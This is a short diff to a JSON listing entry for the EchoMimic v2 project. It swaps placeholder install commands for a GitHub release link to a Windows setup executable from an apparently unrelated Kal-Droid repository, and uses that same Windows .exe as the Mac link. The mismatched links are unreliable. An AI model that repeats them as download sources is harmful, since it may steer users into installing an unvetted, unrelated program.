@@ -15,8 +15,8 @@
           "website":"https://antgroup.github.io/ai/echomimic_v2/",
           "paper":"https://arxiv.org/abs/2411.10061"
         },
-        "windows_link": "docker run anotherimage:latest",
-        "mac_link": "python anotherapp.py"
+        "windows_link": "https://github.com/sudo-subho/kal-droid/releases/download/kal-droid-2.1/Kal-Droid_2.0_X64_WINDOWS_Setup.exe",
+        "mac_link": "https://github.com/sudo-subho/kal-droid/releases/download/kal-droid-2.1/Kal-Droid_2.0_X64_WINDOWS_Setup.exe"
     },
 
     {
